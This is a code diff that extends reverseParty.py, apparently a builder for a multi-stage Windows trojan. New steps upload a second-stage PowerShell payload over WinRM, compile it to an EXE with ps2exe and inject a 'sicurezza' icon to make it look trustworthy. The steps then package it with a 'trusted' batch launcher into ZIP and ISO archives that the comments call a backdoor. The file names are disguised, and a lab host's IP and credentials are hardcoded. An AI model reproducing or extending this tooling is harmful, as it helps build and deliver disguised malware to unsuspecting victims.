@@ -68,13 +68,13 @@ LAUNCHERNAME = "launcher.bat"            # launcher (file trusted by Windows) th
 
 EXENAME      = "'ps2pdf'.exe"            # name of the .exe file to be called by the launcher
 ICONNAME     = "sicurezza.ico"           # icon to inject into executables to make them appear more trustworthy
-EXESECONDNAME= "second.exe"              # name to give to the compiled second stage (EXE)
-EXESTAGER    = "stager.exe"              # name to give to the compiled stager (EXE)
-TROJANEXE    = "trojan.exe"              # name to give to the Trojan (EXE) compiled
+EXESECONDNAME= "01.second.exe"              # name to give to the compiled second stage (EXE)
+EXESTAGER    = "02.stager.exe"              # name to give to the compiled stager (EXE)
+EXETROJAN    = "03.trojan.exe"              # name to give to the Trojan (EXE) compiled
 
-ZIPSECONDNAME= "01.LAUNCHER-SECOND.zip"  # contains launcher + secondStage.exe
-ZIPNAME      = "02.LAUNCHER-STAGER.zip"  # contains launcher + stager.exe (which calls secondStage via the web)
-ISONAME      = "03.LAUCHER-TROJAN.iso"   # contains launcher + trojan (which calls stager, which calls secondStage via the web + if all goes well, also calls the FE file)
+ZIPSECONDNAME= "04.LAUNCHER-SECOND.zip"  # contains launcher + secondStage.exe
+ZIPNAME      = "05.LAUNCHER-STAGER.zip"  # contains launcher + stager.exe (which calls secondStage via the web)
+ISONAME      = "06.LAUCHER-TROJAN.iso"   # contains launcher + trojan (which calls stager, which calls secondStage via the web + if all goes well, also calls the FE file)
 
 # IP, User and Pass to connect to in order to perform the ISO to EXE conversion operation
 WIN_IP       = "192.168.1.111"
@@ -904,7 +904,9 @@ def step4_convert_stager_to_exe():
     except Exception:
        warn(f"Could not insert icon in {EXENAME}.")
 
-
+    # 7h. Get a copy of stager.exe
+    exeto = os.path.join(OUT_DIR, EXESTAGER)
+    shutil.copy(exe, exeto)
 
 # ==============================================================================
 # STEP 5 — ZIP CREATION (LAUNCHER + STAGER EXE)
@@ -1225,6 +1227,10 @@ def step7_convert_trojan_to_exe():
     except Exception:
        warn(f"Could not insert icon in {TROJANNAME}.")
 
+    # 7h. Get a copy of trojan.exe
+    exeto = os.path.join(OUT_DIR, EXETROJAN)
+    info(f"EXE: {exe} -> {exeto}")
+    shutil.copy(exe, exeto)
 
 
 # ==============================================================================
@@ -1304,6 +1310,247 @@ def step8_iso_creation():
     print(f"  {GREEN_DARK}{'─' * 64}{RESET}")
     print()
 
+
+
+# ==============================================================================
+# STEP 9 — SECOND STAGE PS1 → EXE CONVERSION VIA WINRM
+# ==============================================================================
+
+def step9_convert_second_to_exe():
+    section("STEP 9 — Second Stage PS1 → EXE Conversion via WinRM")
+
+    second_local = os.path.join(OUT_DIR, SECONDNAME)
+    exe_local    = os.path.join(OUT_DIR, EXENAME)
+
+    if not WINRM_AVAILABLE:
+        err_nonfatal(
+            "The 'pywinrm' library is not installed. "
+            "Run: pip install pywinrm\n"
+            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    info(f"Connecting to Windows machine at {WIN_IP} via WinRM (user: {WIN_USER})...")
+    try:
+        session = winrm.Session(
+            f"http://{WIN_IP}:5985/wsman",
+            auth=(WIN_USER, WIN_PASS),
+            transport="ntlm",
+            read_timeout_sec=30,
+            operation_timeout_sec=25,
+        )
+        result = session.run_ps("$env:COMPUTERNAME")
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        hostname = result.std_out.decode(errors="replace").strip()
+        ok(f"Connected to Windows machine: {hostname} ({WIN_IP})")
+    except Exception as e:
+        err_nonfatal(
+            f"Could not connect to {WIN_IP} via WinRM: {e}\n"
+            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    # CHUNK_SIZE = 500 (safe WinRM per-command payload size).
+    # WinRM/WSMan has an internal per-command payload limit much smaller than
+    # the Windows CLI limit (8191 chars): passing the b64 string inline inside
+    # Set-Content / Add-Content causes "La riga di comando è troppo lunga"
+    # even with 4000-char chunks.  500 chars fits inside every known WinRM limit.
+    # Each chunk is wrapped in a PS here-string (@'...'@) to avoid quoting issues
+    # with the base64 alphabet (+, /, =).
+    info(f"Uploading {SECONDNAME} to Windows %TEMP% directory (chunked transfer)...")
+    try:
+        with open(second_local, "rb") as f:
+            file_bytes = f.read()
+        b64_full  = base64.b64encode(file_bytes).decode("ascii")
+
+        CHUNK_SIZE = 500
+        chunks     = [b64_full[i:i + CHUNK_SIZE]
+                      for i in range(0, len(b64_full), CHUNK_SIZE)]
+        remote_b64 = f"$env:TEMP\\{SECONDNAME}.b64"
+        remote_dst = f"$env:TEMP\\{SECONDNAME}"
+
+        info(f"  File size: {len(file_bytes):,} bytes  →  "
+             f"{len(chunks)} chunk(s) of up to {CHUNK_SIZE} b64 chars each.")
+
+        init_ps = (
+            f"$chunk = @'\n{chunks[0]}\n'@\n"
+            f"Set-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
+            f"Write-Output 'Chunk 1 OK'"
+        )
+        result = session.run_ps(init_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+
+        for idx, chunk in enumerate(chunks[1:], start=2):
+            append_ps = (
+                f"$chunk = @'\n{chunk}\n'@\n"
+                f"Add-Content -Path \"{remote_b64}\" -Value $chunk.Trim() -Encoding ASCII\n"
+                f"Write-Output 'Chunk {idx} OK'"
+            )
+            result = session.run_ps(append_ps)
+            if result.status_code != 0:
+                raise RuntimeError(result.std_err.decode(errors="replace"))
+
+        _bt_r = "`r"
+        _bt_n = "`n"
+        decode_ps = (
+            f'$b64 = (Get-Content -Path "{remote_b64}" -Raw)'
+            f' -replace "{_bt_r}",\'\' -replace "{_bt_n}",\'\';\n'
+            f'$bytes = [System.Convert]::FromBase64String($b64);\n'
+            f'[System.IO.File]::WriteAllBytes("{remote_dst}", $bytes);\n'
+            f'Remove-Item "{remote_b64}" -Force -EA 0;\n'
+            f"Write-Output 'Decode OK'"
+        )
+        result = session.run_ps(decode_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+
+        ok(f"File {SECONDNAME} uploaded to remote %TEMP% successfully "
+           f"({len(chunks)} chunk(s) × {CHUNK_SIZE} b64 chars).")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to upload {SECONDNAME} to {WIN_IP}: {e}\n"
+            f"  {RED_DARK}The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        return
+
+    info(f"Running Invoke-ps2exe: {SECONDNAME} → {EXENAME}...")
+    try:
+        convert_ps = (
+            f"Invoke-ps2exe \"$env:TEMP\\{SECONDNAME}\" \"$env:TEMP\\{EXENAME}\";\n"
+            f"if (Test-Path \"$env:TEMP\\{EXENAME}\") "
+            f"{{ Write-Output 'Conversion OK' }} "
+            f"else {{ Write-Error 'EXE not created' }}"
+        )
+        result = session.run_ps(convert_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        ok(f"Invoke-ps2exe completed. Remote EXE: %TEMP%\\{EXENAME}")
+    except Exception as e:
+        err_nonfatal(
+            f"ps2exe conversion failed on {WIN_IP}: {e}\n"
+            f"  {RED_DARK}Ensure ps2exe is installed on the Windows machine "
+            f"(Install-Module ps2exe).\n"
+            f"  The stager EXE ({EXENAME}) will NOT be generated. "
+            f"Continuing...{RESET}"
+        )
+        session.run_ps(f"Remove-Item \"$env:TEMP\\{SECONDNAME}\" -Force -EA 0")
+        return
+
+    info(f"Downloading {EXENAME} from Windows %TEMP% to local out/...")
+    try:
+        download_ps = (
+            f"$bytes = [System.IO.File]::ReadAllBytes(\"$env:TEMP\\{EXENAME}\");\n"
+            f"[System.Convert]::ToBase64String($bytes)"
+        )
+        result = session.run_ps(download_ps)
+        if result.status_code != 0:
+            raise RuntimeError(result.std_err.decode(errors="replace"))
+        b64_exe   = result.std_out.decode(errors="replace").strip()
+        exe_bytes = base64.b64decode(b64_exe)
+        with open(exe_local, "wb") as f:
+            f.write(exe_bytes)
+        ok(f"EXE downloaded: {exe_local} ({len(exe_bytes):,} bytes)")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to download {EXENAME} from {WIN_IP}: {e}\n"
+            f"  {RED_DARK}The stager EXE will NOT be available locally. "
+            f"Continuing...{RESET}"
+        )
+
+    info("Cleaning up temporary files from Windows %TEMP%...")
+    try:
+        cleanup_ps = (
+            f"Remove-Item \"$env:TEMP\\{SECONDNAME}\" -Force -EA 0;\n"
+            f"Remove-Item \"$env:TEMP\\{EXENAME}\" -Force -EA 0;\n"
+            f"Write-Output 'Cleanup OK'"
+        )
+        session.run_ps(cleanup_ps)
+        ok("Remote temporary files cleaned up.")
+    except Exception:
+        warn("Could not clean up temporary files on the Windows machine.")
+
+
+    # 7g. Insert icon into EXENAME.exe
+    info(f"Try to insert {ICONNAME} in {EXENAME}")
+    rcedit = os.path.join(STUFF_DIR, "rcedit-x64.exe")
+    exe = os.path.join(OUT_DIR, EXENAME)
+    icon = os.path.join(STUFF_DIR, ICONNAME)
+    try:
+      cmd = [
+        "wine",
+        str(rcedit),
+        str(exe),
+        "--set-icon",
+        str(icon)
+      ]
+      subprocess.run(cmd, check=True)
+      info("icon inserted correctly")
+    except Exception:
+       warn(f"Could not insert icon in {EXENAME}.")
+
+    # 7h. Get a copy of stager.exe
+    exeto = os.path.join(OUT_DIR, EXESECONDNAME)
+    shutil.copy(exe, exeto)
+
+
+
+# ==============================================================================
+# STEP 10 — ZIP CREATION (LAUNCHER + SECOND STAGE EXE)
+# ==============================================================================
+
+def step10_create_zip():
+    """
+    STEP 10: Create the backdoor ZIP archive containing the launcher and second stage EXE.
+
+    Actions performed:
+      10a. Verify that the stager EXE (EXENAME) exists in out/.
+      10b. Verify that the launcher file (LAUNCHERNAME) exists in stuff/.
+      10c. Create ZIPSECONDNAME inside out/ with EXENAME and LAUNCHERNAME at archive root.
+      10d. Print deployment reminders.
+    """
+    section("STEP 10 — ZIP Creation (Launcher + Second Stage EXE)")
+
+    exe_local      = os.path.join(OUT_DIR, EXENAME)
+    launcher_local = os.path.join(STUFF_DIR, LAUNCHERNAME)
+    zip_local      = os.path.join(OUT_DIR, ZIPSECONDNAME)
+
+    if not os.path.isfile(exe_local):
+        err_nonfatal(
+            f"Second Stage EXE not found: {exe_local}\n"
+            f"  {RED_DARK}Ensure Step 9 completed successfully. "
+            f"ZIP will NOT be created. Continuing...{RESET}"
+        )
+        return
+
+    if not os.path.isfile(launcher_local):
+        err_nonfatal(
+            f"Launcher file not found: {launcher_local}\n"
+            f"  {RED_DARK}Ensure '{LAUNCHERNAME}' exists inside the stuff/ directory. "
+            f"ZIP will NOT be created. Continuing...{RESET}"
+        )
+        return
+
+    info(f"Creating ZIP archive: {zip_local}")
+    info(f"  Adding: {EXENAME}       (from out/)")
+    info(f"  Adding: {LAUNCHERNAME}  (from stuff/)")
+    try:
+        with zipfile.ZipFile(zip_local, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.write(exe_local,      arcname=EXENAME)
+            zf.write(launcher_local, arcname=LAUNCHERNAME)
+        zip_size = os.path.getsize(zip_local)
+        ok(f"ZIP archive created successfully: {zip_local} ({zip_size:,} bytes)")
+    except Exception as e:
+        err_nonfatal(
+            f"Failed to create ZIP archive: {e}\n"
+            f"  {RED_DARK}ZIP will NOT be available. Continuing...{RESET}"
+        )
+        return
+
  
     
 
@@ -1321,37 +1568,49 @@ def main():
     step6_obfuscate_trojan()
     step7_convert_trojan_to_exe()
     step8_iso_creation()
+    step9_convert_second_to_exe()
+    step10_create_zip()
 
     section("ALL STEPS COMPLETED")
     ok("reverseParty.py finished successfully.")
     print()
-    info(f"Output directory      : {OUT_DIR}")
-    info(f"Second stage          : {os.path.join(OUT_DIR, SECONDNAME)}")
-    info(f"Stager (PS1)          : {os.path.join(OUT_DIR, STAGERNAME)}")
+    info(f"Output directory                 : {OUT_DIR}")
 
-    exe_path = os.path.join(OUT_DIR, EXENAME)
+    exe_path = os.path.join(OUT_DIR, EXESECONDNAME)
     if os.path.isfile(exe_path):
-        info(f"Stager (EXE)          : {exe_path}")
+        info(f"Second Stage (EXE)               : {exe_path}")
     else:
-        warn(f"Stager (EXE)          : not generated (see Step 4 output above)")
+        warn(f"Second Stage (EXE)               : not generated")
+
+    exe_path = os.path.join(OUT_DIR, EXESTAGER)
+    if os.path.isfile(exe_path):
+        info(f"Stager (EXE)                     : {exe_path}")
+    else:
+        warn(f"Stager (EXE)                     : not generated")
+
+    exe_path = os.path.join(OUT_DIR, EXETROJAN)
+    if os.path.isfile(exe_path):
+        info(f"Trojan (EXE)                     : {exe_path}")
+    else:
+        warn(f"Trojan (EXE)                     : not generated")
+
+    exe_path = os.path.join(OUT_DIR, ZIPSECONDNAME)
+    if os.path.isfile(exe_path):
+        info(f"Launcher + SecondStage.exe (ZIP) : {exe_path}")
+    else:
+        warn(f"Launcher + SecondStage.exe (ZIP) : not generated")
 
     zip_path = os.path.join(OUT_DIR, ZIPNAME)
     if os.path.isfile(zip_path):
-        info(f"Backdoor ZIP          : {zip_path}")
+        info(f"Launcher + Stager.exe (ZIP)      : {zip_path}")
     else:
-        warn(f"Backdoor ZIP          : not generated (see Step 5 output above)")
+        warn(f"Launcher + Stager.exe (ZIP)      : not generated")
 
-    trojan_path = os.path.join(OUT_DIR, TROJANNAME)
+    trojan_path = os.path.join(OUT_DIR, ISONAME)
     if os.path.isfile(trojan_path):
-        info(f"Trojan (PS1)          : {trojan_path}")
+        info(f"Laucher + Trojan.exe (ISO)       : {trojan_path}")
     else:
-        warn(f"Trojan (PS1)          : not generated (see Step 6 output above)")
-
-    trojan_exe_path = os.path.join(OUT_DIR, ISONAME)
-    if os.path.isfile(trojan_exe_path):
-        info(f"Trojan (ISO)          : {trojan_exe_path}")
-    else:
-        warn(f"Trojan (ISO)          : not generated (see Step 7 output above)")
+        warn(f"Laucher + Trojan.exe (ISO)       : not generated")
 
     print()
 
